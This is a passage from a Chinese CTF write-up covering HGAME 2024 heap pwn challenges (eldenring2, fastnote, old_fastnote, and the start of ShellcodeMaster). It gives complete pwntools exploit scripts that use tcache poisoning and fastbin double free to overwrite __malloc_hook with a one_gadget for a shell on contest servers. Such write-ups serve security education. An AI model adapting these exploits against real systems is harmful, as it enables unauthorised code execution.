aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有开地址随机化，虽然没什么用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2024/hgame/eldenring2/pwn'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x3fe000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建堆到<code>unsorted bin</code>中之后<code>show</code>出堆中的<code>libc</code>，再改<code>tcache</code>中某个堆的<code>fd</code>为<code>malloc_hook</code>再申请出来改成<code>ogg</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.100.137.175'</span><span class="token punctuation">,</span> <span class="token number">30743</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecbe0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basemalloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseedit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fastnote"><a href="#fastnote" class="headerlink" title="fastnote"></a>fastnote</h2><p><code>2.32</code>版本的<code>double free</code>，没有edit函数</p><p>先利用从<code>unsorted bin</code>中申请的堆含有<code>libc</code>地址的特点泄露<code>libc</code>，再<code>double free</code>改<code>tcache</code>中的堆地址为<code>malloc_hook</code>，最后把堆申请出来改成<code>ogg</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.100.137.175'</span><span class="token punctuation">,</span> <span class="token number">32683</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecc61</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baselibc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="old-fastnote"><a href="#old-fastnote" class="headerlink" title="old_fastnote"></a>old_fastnote</h2><p>2.23 <code>double free</code>，用<code>find_fake_fast</code>绕过<code>fastbin</code>对申请的堆大小和申请的大小的检查</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'106.14.57.14'</span><span class="token punctuation">,</span> <span class="token number">30286</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c4b78</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>fake <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>fake<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ShellcodeMaster"><a href="#ShellcodeMaster" class="headerlink" title="ShellcodeMaster"></a>ShellcodeMaster</h2><p>向<code>0x2333000</code>写入之后去掉写权限，并且改了所有寄存器</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">mprotect</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:0000000000401386 49 C7 C7 00 30 33 02          mov     r15, 2333000h.text:000000000040138D 48 C7 C0 33 23 00 00          mov     rax, 2333h.text:0000000000401394 48 C7 C3 33 23 00 00          mov     rbx, 2333h.text:000000000040139B 48 C7 C1 33 23 00 00          mov     rcx, 2333h.text:00000000004013A2 48 C7 C2 33 23 00 00          mov     rdx, 2333h.text:00000000004013A9 48 C7 C4 33 23 00 00          mov     rsp, 2333h.text:00000000004013B0 48 C7 C5 33 23 00 00          mov     rbp, 2333h.text:00000000004013B7 48 C7 C6 33 23 00 00          mov     rsi, 2333h.text:00000000004013BE 48 C7 C7 33 23 00 00          mov     rdi, 2333h.text:00000000004013C5 49 C7 C0 33 23 00 00          mov     r8, 2333h.text:00000000004013CC 49 C7 C1 33 23 00 00          mov     r9, 2333h.text:00000000004013D3 49 C7 C2 33 23 00 00          mov     r10, 2333h.text:00000000004013DA 49 C7 C3 33 23 00 00          mov     r11, 2333h.text:00000000004013E1 49 C7 C4 33 23 00 00          mov     r12, 2333h.text:00000000004013E8 49 C7 C5 33 23 00 00          mov     r13, 2333h.text:00000000004013EF 49 C7 C6 33 23 00 00          mov     r14, 2333h.text:00000000004013F6 41 FF E7                      jmp     r15<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题的思路是先调用<code>mprotect</code>给写权限，再重新读<code>shellcode</code></p><p>相关汇编知识点：</p><pre class="line-numbers language-none"><code 